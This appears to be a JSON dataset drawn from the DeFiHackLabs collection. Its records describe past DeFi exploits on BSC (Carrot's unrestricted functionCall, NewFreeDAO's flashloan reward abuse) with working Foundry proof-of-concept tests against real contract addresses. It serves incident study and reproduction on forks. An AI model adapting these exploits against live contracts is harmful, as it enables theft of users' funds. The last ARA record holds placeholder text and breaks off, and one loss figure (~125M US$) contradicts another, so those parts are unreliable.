[
    {
        "id": "c26164cdf9",
        "is_ready": true,
        "content": "### 20221010 Carrot - Public functionCall\n#### Contract\n[Carrot_exp.sol](src/test/Carrot_exp.sol)\n#### Link reference\nhttps://twitter.com/BlockSecTeam/status/1579908411235237888\nhttps://bscscan.com/tx/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9",
        "date": "20221010",
        "target": "Carrot",
        "attack_title": "Public functionCall",
        "vuln_desc": "The vulnerability in the code is an unrestricted function call. The `transReward` function allows any arbitrary data to be passed to the `functionCall` function without any validation or restriction. This can potentially lead to unauthorized actions or the execution of arbitrary code.",
        "poc_explain": "The proof-of-concept (PoC) testcase demonstrates the exploitation of the unrestricted function call vulnerability. In the `testExploit` function, the attacker first calls the `transReward` function with specific data to set the owner of the `Carrot` contract. Then, the attacker performs a transferFrom operation and swaps `Carrot` tokens to BSC-USD tokens using the `CarrotToUST` function. This showcases how an attacker can take advantage of the vulnerability to execute unauthorized operations and potentially manipulate the contract for their own benefit.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BlockSecTeam/status/1579908411235237888",
                "content": "Carrot on BSC was attacked. Here is the link to the transaction: https://phalcon.blocksec.com/tx/bsc/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9 (Thanks @bbbb for sharing this transaction hash).\n\nWe have witnessed a public burn and public transfer. Now, we have a public functionCall.\n\nWhat comes next?\n\n```solidity\nfunction transReward(bytes memory data) public {\n    pool.functionCall(data);\n}\n```"
            },
            {
                "link": "https://bscscan.com/tx/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9",
                "content": null
            }
        ],
        "data": [
            {
                "contract_path": "src/test/Carrot_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\ninterface ICarrot is IERC20{\n    function transReward(bytes memory data) external;\n}\ncontract ContractTest is DSTest {\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    ICarrot Carrot = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);\n    IERC20 USD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22055611); // fork bsc at block 22055611\n        cheats.label(address(Carrot), \"Carrot\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(0x6863b549bf730863157318df4496eD111aDFA64f),\n            \"Pool\");\n    }\n    function testExploit() public {\n        console.log(\"Perform transReward to set owner\");\n        Carrot.transReward(hex\"bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84\");\n        console.log(\"Perform transferFrom\");\n        Carrot.transferFrom(0x00B433800970286CF08F34C96cf07f35412F1161,\n            address(this),\n            310344736073087429864760);\n        console.log(\"Perform Carrot to BSC-USD swap\");\n        CarrotToUST();\n        console.log(\"After exploiting, BSC-USD balance:\",\n            USD.balanceOf(address(this)) / 1e18);\n    }\n    function migrateWithdraw(address,\n        uint256 //callback) public {}\n    function CarrotToUST() internal {\n        Carrot.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(Carrot);\n        path[1] = address(USD);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(Carrot.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp);\n    }\n}",
                "token_count": 563,
                "interfaces": [
                    {
                        "name": "ICarrot",
                        "content": "interface ICarrot is IERC20{\n    function transReward(bytes memory data) external;\n}\n",
                        "token_count": 20,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "1fa4ecdea1",
        "is_ready": true,
        "content": "### 20220908 NewFreeDAO - Flashloans Attack\n#### Lost: 1M US$\n#### Contract\n[NewFreeDAO_exp.sol](src/test/NewFreeDAO_exp.sol)\n#### Link reference\nhttps://twitter.com/SlowMist_Team/status/1567854876633309186\nhttps://bscscan.com/tx/0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26",
        "date": "20220908",
        "target": "NewFreeDAO",
        "attack_title": "Flashloans Attack",
        "vuln_desc": "The vulnerability can be classified as an insecure reward mechanism. In particular, the flaw lies in the reward calculation method of the targeted smart contract. This method overly relies on the caller's token balance without considering other potential factors. This simplistic calculation and distribution process is easily exploitable and can lead to an attacker draining all the funds from the pool.",
        "poc_explain": "The proof of concept (PoC) reveals the vulnerability through a series of contract interactions and transactions.\n\n1. It starts by initializing a flashloan from PancakeSwap, borrowing a significant amount of $WBNB and converting it into $NFD tokens.\n2. The $NFD tokens are then transferred to an attacker contract. This contract generates another contract (Contract 2) to receive the funds.\n3. Contract 2 calls a specific function (0x6811e3b9) in the vulnerable contract. This function calculates the reward based on the token balance and transfers it to the caller.\n4. After receiving the reward, Contract 2 transfers the funds to a newly deployed attack contract and repeats the process. The loop continues until all funds from the pool have been withdrawn.\n5. Once all the funds have been drained, the attacker swaps the $NFD tokens back to $WBNB via PancakeSwap, repays the flashloan, and retains the profit.\n\nThis process effectively showcases how the insecure reward calculation method can be exploited to drain all the funds from the contract. The PoC test case emulates the real-life steps taken by an attacker to exploit the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/SlowMist_Team/status/1567854876633309186",
                "content": "Brief Analysis of the New Free DAO Exploit\nEarlier today, our security team detected a flashloan attack on the New Free DAO project, a component of the BSC chain.\n\nHere's a detailed breakdown of the events:\n\n1. The attacker initiated a flashloan from PancakeSwap, borrowing a large sum of $WBNB which was then converted into $NFD tokens.\n2. The attacker transferred the $NFD tokens acquired in step one to an attack contract. This contract, in turn, created a secondary attack contract to receive the funds.\n3. The secondary contract (Contract 2) invoked function 0x6811e3b9 in the compromised contract (0x8b068e22). This contract is not open source; however, upon decompiling it, we discerned that the function merely calculates the reward based on the caller's NFD token balance and transfers this reward to the caller.\n4. The higher the balance, the larger the reward. After receiving the reward, Contract 2 transferred the funds to a newly deployed attack contract. The 0x6811e3b9 function was called again to secure another reward, continuing this process until all funds in the pool were depleted.\n5. The attacker converted the NFD tokens back to WBNB via PancakeSwap, repaid the flashloan, and retained approximately 4481 $WBNB (~$1.25M).\n\nThe main vulnerability exploited in this attack was the simplistic calculation of the reward, which relied solely on the caller's balance. The SlowMist security team recommends incorporating multiple factors into the reward calculation mechanism to prevent such exploits in the future.\n"
            },
            {
                "link": "https://bscscan.com/tx/0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26",
                "content": null
            }
        ],
        "data": [
            {
                "contract_path": "src/test/NewFreeDAO_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @KeyInfo - Total Lost : 4481 BNB (~125M US$)\n// Attacker : 0x22c9736d4fc73a8fa0eb436d2ce919f5849d6fd2\n// Attack Contract : 0xa35ef9fa2f5e0527cb9fbb6f9d3a24cfed948863\n// Vulnerable Contract : 0x8b068e22e9a4a9bca3c321e0ec428abf32691d1e\n// Attack Tx1 : 0x1fea385acf7ff046d928d4041db017e1d7ead66727ce7aacb3296b9d485d4a26 (-2952.97 BNB)\n// Attack Tx2 : 0xb6f9b5ef1feeadb379a2de8f79bb04dd6920bfb214136d057eed4ce23a0003f8 (-1412.77 BNB)\n// Attack Tx3 : 0x8b77d75efa185295b09bdf2edcb509541fdde40ed5484212331ceac41b2f4ac0 (-115.57  BNB)\n// @Info\n// WBNB-USDT Pair : 0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae\n// USDT-NFD Pair  : 0x26c0623847637095655b2868c3182b2285bdaeaf\n// @Analysis\n// PeckShield : https://twitter.com/peckshield/status/1567710274244825088\n// Beosin : https://twitter.com/BeosinAlert/status/1567757251024396288\n// Blocksec : https://twitter.com/BlockSecTeam/status/1567706201277988866\n// SlowMist : https://twitter.com/SlowMist_Team/status/1567854876633309186\n// CertiK : https://mp.weixin.qq.com/s/xGQ9SIxrwOizog3XDnM5iw\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant vulnContract = 0x8B068E22E9a4A9bcA3C321e0ec428AbF32691D1E;\ncontract Attacker is Test {\n    IPancakeRouter constant PancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\n    address constant dodo = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;\n    address constant usdt = 0x55d398326f99059fF775485246999027B3197955;\n    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 21140434);\n        console.log(\"---------- Reproduce Attack Tx1 ----------\");\n        cheat.label(address(PancakeRouter), \"PancakeRouter\");\n        cheat.label(vulnContract, \"vulnContractName\");\n        cheat.label(wbnb, \"WBNB\");\n        cheat.label(dodo, \"DODO\");\n        cheat.label(usdt, \"USDT\");\n        cheat.label(nfd, \"NFD\");\n    }\n    function testExploit() public {\n        console.log(\"Flashloan 250 WBNB from DODO DLP...\");\n        bytes memory data = abi.encode(dodo, wbnb, 250*1e18);  \n        DVM(dodo).flashLoan(0, 250*1e18, address(this), data);\n    }\n    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        require(IERC20(wbnb).balanceOf(address(this)) == quoteAmount, \"Invalid WBNB amount\");\n        require(quoteAmount == 250*1e18, \"Invalid WBNB amount\");\n        console.log(\"Swap 250 WBNB to NFD...\");\n        address[] memory path = new address[](3);\n        path[0] = wbnb;\n        path[1] = usdt;\n        path[2] = nfd;\n        IERC20(wbnb).approve(address(PancakeRouter), type(uint256).max);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(quoteAmount, 0, path, address(this), block.timestamp);\n        emit log_named_decimal_uint(\"[*] NFD balance before attack\", IERC20(nfd).balanceOf(address(this)), 18);\n        console.log(\"Abuse the Reward Contract...\");\n        for(uint8 i; i < 50; i++){\n            Exploit exploit = new Exploit();\n            uint256 nfdAmount = IERC20(nfd).balanceOf(address(this));\n            IERC20(nfd).transfer(address(exploit), nfdAmount);\n            exploit.abuse();\n        }\n        emit log_named_decimal_uint(\"[*] NFD balance after attack\", IERC20(nfd).balanceOf(address(this)), 18);\n        console.log(\"Swap the profit...\");\n        uint256 nfdBalance = IERC20(nfd).balanceOf(address(this));\n        path[0] = nfd;\n        path[1] = usdt;\n        path[2] = wbnb;\n        IERC20(nfd).approve(address(PancakeRouter), type(uint256).max);\n        PancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(nfdBalance, 0, path, address(this), block.timestamp);\n        console.log(\"Repay the flashloan...\");\n        IERC20(wbnb).transfer(msg.sender, 250*1e18);\n        emit log_named_decimal_uint(\"Attacker's Net Profit\", IERC20(wbnb).balanceOf(address(this)), 18);\n    }\n}\ncontract Exploit is Test {\n    address constant rewardContract = vulnContract;\n    address constant nfd = 0x38C63A5D3f206314107A7a9FE8cBBa29D629D4F9;\n    // Function 0xe2f9d09c\n    function abuse() external {\n        rewardContract.call(abi.encode(bytes4(0x6811e3b9)));\n        uint256 bal = IERC20(nfd).balanceOf(address(this));\n        require(IERC20(nfd).transfer(msg.sender, bal), \"Transfer profit failed\");\n    }\n}",
                "token_count": 1533,
                "interfaces": [
                    {
                        "name": "IPancakeRouter",
                        "content": "interface IPancakeRouter {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  receive() external payable;\n}\n",
                        "token_count": 1170,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "dc91671aa8",
        "is_ready": false,
        "content": "### 20230618 ARA - Incorrect handling of permissions\n### Lost: ~$125k\n#### Contract\n[ARA_exp.sol](src/test/ARA_exp.sol)\n#### Link Reference\nhttps://twitter.com/BeosinAlert/status/1670638160550965248",
        "date": "20230618",
        "target": "ARA",
        "attack_title": "Incorrect handling of permissions",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
